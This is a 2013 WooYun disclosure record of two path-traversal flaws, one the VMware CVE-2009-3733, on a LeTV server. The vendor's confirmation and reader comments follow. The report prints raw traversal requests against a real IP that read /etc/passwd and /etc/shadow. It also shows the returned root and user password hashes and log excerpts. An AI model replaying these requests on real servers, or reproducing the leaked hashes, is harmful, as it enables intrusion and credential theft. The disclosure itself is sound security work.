{"id": 7757, "wybug_id": "wooyun-2013-040484", "wybug_title": "乐视网某服务器的CVE-2009-3733漏洞(root权限)", "wybug_corp": "乐视网", "wybug_author": "霍大然", "wybug_date": "2013-10-21 10:37", "wybug_open_date": "2013-12-05 10:37", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-05：\t细节向公众公开  简要描述： 其实就是两个任意文件读取，其中一个是vmware的CVE-2009-3733 详细说明：  服务器IP：http://123.126.33.181这个网站打开的话只有一个测试页面:OK一、一个目录遍历\nRequest：GET //../../../../../../../../etc/passwd HTTP/1.1Host: 123.126.33.181Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*Response：HTTP/1.1 200 OKDate: Sun, 20 Oct 2013 08:31:47 GMTConnection: keep-aliveContent-Length: 1591root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin abrt:x:173:173::/etc/abrt:/sbin/nologin saslauth:x:499:76:\"Saslauthd user\":/var/empty/saslauth:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin haldaemon:x:68:68:HAL daemon:/:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin puppet:x:500:500::/etc/puppet/:/sbin/nologin named:x:25:25:Named:/var/named:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin oprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin lele:x:0:0:lele:/home/lele:/bin/bash zabbix:x:502:502:zabbix:/usr/local/zabbix:/bin/bash同理：shadow文件：root:$6$yUr4JmQR$ls6.9ry5VtlShVVNS2EobThM2grdLpIPveeFHL9S8HPXlzuV1CnTWzsKq59OrmISwqa9qNB/PJMzFURxWO5xG1:15687:0:99999:7:::bin:*:15240:0:99999:7:::daemon:*:15240:0:99999:7:::adm:*:15240:0:99999:7:::lp:*:15240:0:99999:7:::sync:*:15240:0:99999:7:::shutdown:*:15240:0:99999:7:::halt:*:15240:0:99999:7:::mail:*:15240:0:99999:7:::uucp:*:15240:0:99999:7:::operator:*:15240:0:99999:7:::games:*:15240:0:99999:7:::gopher:*:15240:0:99999:7:::ftp:*:15240:0:99999:7:::nobody:*:15240:0:99999:7:::dbus:!!:15609::::::vcsa:!!:15609::::::rpc:!!:15609:0:99999:7:::abrt:!!:15609::::::saslauth:!!:15609::::::postfix:!!:15609::::::haldaemon:!!:15609::::::ntp:!!:15609::::::avahi:!!:15609::::::rpcuser:!!:15609::::::nfsnobody:!!:15609::::::sshd:!!:15609::::::puppet:!!:15609:0:99999:7:::named:!!:15609::::::tcpdump:!!:15609::::::oprofile:!!:15609::::::lele:$6$uOoLyAZ.$dfFEtnzTrbo9FM3LbwIKzI3L43evuszAg1BmGw4QdXoKoOxQ2D19BOt2PCh.tZ9d.23DaZvp/8KJJPpBslADx.:15609:0:99999:7:::zabbix:$6$j3dAdwlu4u//DZ8h$11FwI1XcmPaHbRE.rhvLbHVfaRxrbK6R3iSdjE2UONRo.VxhdTCoXcyUON3XlXcMnoFZ/moMZA033Hoqw3PW8/:15610:0:99999:7:::\n二、VMware的目录遍历\nRequest：GET /sdk/../../../../../../../../../../../../../etc/passwd HTTP/1.1Host: 123.126.33.181Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*\n同样可以得到：\n\n一般的遍历很难得到安全日志文件，但这个vmware是可以得到的：\n\n启动日志：\n\n   漏洞证明：  var/log/messages：\n\n近期访问日志：\nOct 20 16:49:42 cdn sshd[931]: Connection closed by 117.121.54.22Oct 20 16:50:56 cdn sudo:   zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/sbin/ethtool eth0Oct 20 16:51:38 cdn sudo:   zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/cat /var/log/messagesOct 20 16:51:38 cdn sudo:   zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/cat /var/log/messagesOct 20 16:51:38 cdn sudo:   zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/cat /var/log/messagesOct 20 16:51:38 cdn sudo:   zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/cat /var/log/messagesOct 20 16:51:38 cdn sudo:   zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/cat /var/log/messagesOct 20 16:51:38 cdn sudo:   zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/cat /var/log/messagesOct 20 16:51:38 cdn sudo:   zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/cat /var/log/messagesOct 20 16:51:38 cdn sudo:   zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/cat /var/log/messagesOct 20 16:51:38 cdn sudo:   zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/cat /var/log/messagesOct 20 16:51:38 cdn sudo:   zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/cat /var/log/messagesOct 20 16:51:38 cdn sudo:   zabbix : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/cat /var/log/messagesOct 20 16:54:45 cdn sshd[1379]: Connection closed by 117.121.54.22\n用户hash:lele:$6$uOoLyAZ.$dfFEtnzTrbo9FM3LbwIKzI3L43evuszAg1BmGw4QdXoKoOxQ2D19BOt2PCh.tZ9d.23DaZvp/8KJJPpBslADx.:15609:0:99999:7:::zabbix:$6$j3dAdwlu4u//DZ8h$11FwI1XcmPaHbRE.rhvLbHVfaRxrbK6R3iSdjE2UONRo.VxhdTCoXcyUON3XlXcMnoFZ/moMZA033Hoqw3PW8/:15610:0:99999:7::   修复方案：  升级；改密码；   版权声明：转载请注明来源 霍大然@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-10-21 11:34 厂商回复： 感谢挖掘，我们先尽快修复，礼物的事情我来想办法啊。。。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-21 10:45 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  @乐视网 求礼物！    \n     2013-10-21 11:07 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  CVE-2009-3733 是VM虚拟机逃逸那个？    \n     2013-10-21 11:08 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  是的    \n     2013-10-21 11:11 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  @疯狗 @Finger 求审核：http://www.wooyun.org/bugs/wooyun-2013-040395/trace/74d39b5bba8b99a985a9b6280b34b4dc    \n     2013-10-21 11:42 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @霍大然 礼物的事情我来想办法啊。。。厂商相当无奈啊    \n     2013-12-05 11:26 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  不是每个厂商都有预算买礼物的。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}